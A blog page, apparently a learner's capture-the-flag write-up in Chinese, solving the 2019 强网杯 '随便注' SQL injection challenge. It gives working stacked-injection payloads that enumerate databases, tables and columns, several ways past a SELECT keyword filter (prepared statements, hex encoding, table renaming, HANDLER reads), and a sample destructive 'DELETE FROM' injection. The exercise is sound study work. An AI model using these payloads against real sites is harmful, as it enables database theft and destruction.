@@ -1,0 +1,685 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
+  <link rel="icon" href="/img/logo.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="aidemofashi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="强网杯 2019 随便注上次做这题还是两个月前，好像也是这题坚定了我打基础的原因，虽然现在看还是得看大佬们的wp但以前是wp都看不明白先是数字传参，注入点 1?inject&#x3D;1&#x27;# 尝试 11&#x27;union select 1,2#  回显   return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="note-20">
+<meta property="og:url" content="https://aidemofashi.github.io/2025/03/28/note-20/index.html">
+<meta property="og:site_name" content="aidemofashi&#39;s blog">
+<meta property="og:description" content="强网杯 2019 随便注上次做这题还是两个月前，好像也是这题坚定了我打基础的原因，虽然现在看还是得看大佬们的wp但以前是wp都看不明白先是数字传参，注入点 1?inject&#x3D;1&#x27;# 尝试 11&#x27;union select 1,2#  回显   return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&amp;#x2">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-28T07:12:28.000Z">
+<meta property="article:modified_time" content="2025-03-28T15:57:26.760Z">
+<meta property="article:author" content="aidemofashi">
+<meta property="article:tag" content="sql">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>note-20 - aidemofashi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"aidemofashi.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>aidemofashi&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="http://39.105.15.250/aidemofashi_home/index.html" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/main.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="note-20"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-28 15:12" pubdate>
+          2025年3月28日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">note-20</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="强网杯 2019 随便注"></a>强网杯 2019 随便注</h1><p>上次做这题还是两个月前，好像也是这题坚定了我打基础的原因，虽然现在看还是得看大佬们的wp<br>但以前是wp都看不明白<br>先是数字传参，<br>注入点</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">inject</span>=1&#x27;#<br></code></pre></td></tr></table></figure>
+<p>尝试</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p>回显  </p>
+<p>return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);</p>
+<p>尝试</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">1</span>&#x27;or extractvalue(<span class="hljs-number">1</span>,concat(&#x27;!&#x27;,database()))  # <br></code></pre></td></tr></table></figure>
+<p>成功回显<br>error 1105 : XPATH syntax error: ‘!supersqli’</p>
+<p>好像能用报错，但是select被过滤了呀🤡</p>
+<p>尝试了<br>双写绕过<br>使用URL编码<br>&lt;&gt;绕过<br>无果  </p>
+<p>只能看wp了吗<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a><br>原wp写的是真的好，详细透彻</p>
+<p>使用堆叠注入，查看数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show databases;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">回显：</span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(11) &quot;ctftraining&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(18) &quot;information_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(5) &quot;mysql&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(18) &quot;performance_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(9) &quot;supersqli&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(4) &quot;test&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+<p>然后是查看表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables from supersqli;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">回显：</span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(16) &quot;1919810931114514&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(5) &quot;words&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+<p>查看字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show colums from &quot;1919810931114514&quot;;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">没法回显</span><br><span class="hljs-string"></span><br><span class="hljs-string">改为</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;1919810931114514&#x27;</span>;#<br><br>不行<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">成功回显:</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(6) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(4) &quot;flag&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(12) &quot;varchar(100)&quot;</span><br><span class="hljs-string">  [2]=&gt;</span><br><span class="hljs-string">  string(2) &quot;NO&quot;</span><br><span class="hljs-string">  [3]=&gt;</span><br><span class="hljs-string">  string(0) &quot;&quot;</span><br><span class="hljs-string">  [4]=&gt;</span><br><span class="hljs-string">  NULL</span><br><span class="hljs-string">  [5]=&gt;</span><br><span class="hljs-string">  string(0) &quot;&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>注意，如果tableName是纯数字，需要用<code>包裹，比如1&#39;;desc </code>1919810931114514&#96;;#</p>
+</blockquote>
+<p>原来是 &#96; 而不是 ‘ 🤡</p>
+<p>到这步骤就有多种方法解题了  </p>
+<h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><p>通过预编译的方式拼接select 关键字：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;prepare hack from concat(&#x27;</span>sele<span class="hljs-string">&#x27;,&#x27;</span>ct<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`<span class="hljs-string">&#x27;);execute hack;#</span><br></code></pre></td></tr></table></figure>
+<p>得flag{f2078443-bdad-4914-b367-e6691fd333c5}</p>
+<h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><blockquote>
+<p>将select * from <code>1919810931114514</code>语句进行16进制编码<br>73656c656374202a2066726f6d20603139313938313039333131313435313460</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</span><br><span class="hljs-string">或者定义一个变量名</span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">Set</span> <span class="hljs-variable">@jia</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="hljs-keyword">PREPARE</span> hacker <span class="hljs-keyword">from</span> <span class="hljs-variable">@jia</span>;<span class="hljs-keyword">EXECUTE</span> hacker;#<br></code></pre></td></tr></table></figure>
+<p>看情况用把，我觉得能用预编译的话，那很多都能解决了</p>
+<h2 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h2><blockquote>
+<p>最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为id我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# </span><br><span class="hljs-string">然后直接</span><br><span class="hljs-string">1&#x27;</span>; <span class="hljs-keyword">or</span> ture<br>查看所有字段拿到flag<br></code></pre></td></tr></table></figure>
+
+<p>666，改不了查询语句就改表名，思路太开阔了，</p>
+<p>这里要注意:<br>我在自己尝试的时候没有将换表名和改字段的操作一条语句完成，我是先改的words to words1，导致了源码sql查询语句的查words出错，后面将flag表改成words的操作无法传入，一切后续操作失效，这时sql语句查询的words，但是现在已经没有words这个表了，原sql语句就用不了了，永远报错，应该是相当于这个靶机废了；</p>
+<h2 id="法四："><a href="#法四：" class="headerlink" title="法四："></a>法四：</h2><blockquote>
+<p>此题还可以通过handle直接出答案：</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></code></pre></td></tr></table></figure>
+<h1 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h1><hr>
+<h2 id="0x01-堆叠注入原理"><a href="#0x01-堆叠注入原理" class="headerlink" title="0x01 堆叠注入原理"></a>0x01 堆叠注入原理</h2><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<h2 id="0x02-预编译"><a href="#0x02-预编译" class="headerlink" title="0x02 预编译"></a>0x02 预编译</h2><blockquote>
+<p>预编译相当于定一个语句相同，参数不通的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤,  </p>
+</blockquote>
+<p>我理解是先写好sql语句命令，然后执行，类似编程语言里的定义函数或类？<br>预编译命令用法:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> 名称 <span class="hljs-keyword">FROM</span> 	<span class="hljs-keyword">Sql</span>语句 ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> 名称 <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure>
+<p>例子</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">方法一：<br><span class="hljs-keyword">SElECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_user <span class="hljs-keyword">WHERE</span> USER_ID <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><br>方法二：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br><br>方法三：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br><br>方法四：<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x03-更改表名"><a href="#0x03-更改表名" class="headerlink" title="0x03 更改表名"></a>0x03 更改表名</h2><p>修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；<br>修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</p>
+<h2 id="0x04-handle"><a href="#0x04-handle" class="headerlink" title="0x04 handle"></a>0x04 handle</h2><p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 打开一个表名为 tbl_name 的表的句柄<br>HANDLER tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] alias]<br><br># <span class="hljs-number">1</span>、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;</span> &#125; (value1,value2,...)<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># <span class="hljs-number">2</span>、通过索引查看表<br># <span class="hljs-keyword">FIRST</span>: 获取第一行（索引最小的一行）<br># NEXT: 获取下一行<br># PREV: 获取上一行<br># <span class="hljs-keyword">LAST</span>: 获取最后一行（索引最大的一行）<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT <span class="hljs-operator">|</span> PREV <span class="hljs-operator">|</span> <span class="hljs-keyword">LAST</span> &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># <span class="hljs-number">3</span>、不通过索引查看表<br># READ <span class="hljs-keyword">FIRST</span>: 获取句柄的第一行<br># READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）<br># 最后一行执行之后再执行 READ NEXT 会返回一个空的结果<br>HANDLER tbl_name READ &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># 关闭已打开的句柄<br>HANDLER tbl_name <span class="hljs-keyword">CLOSE</span><br><br></code></pre></td></tr></table></figure>
+<p>参考wp里的语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></code></pre></td></tr></table></figure>
+<p>更详细用法<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/sql/" class="print-no-link">#sql</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>note-20</div>
+      <div>https://aidemofashi.github.io/2025/03/28/note-20/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>aidemofashi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/06/note-21/" title="note-21">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">note-21</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/27/note-19-%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" title="note-19-盲注脚本编写">
+                        <span class="hidden-mobile">note-19-盲注脚本编写</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
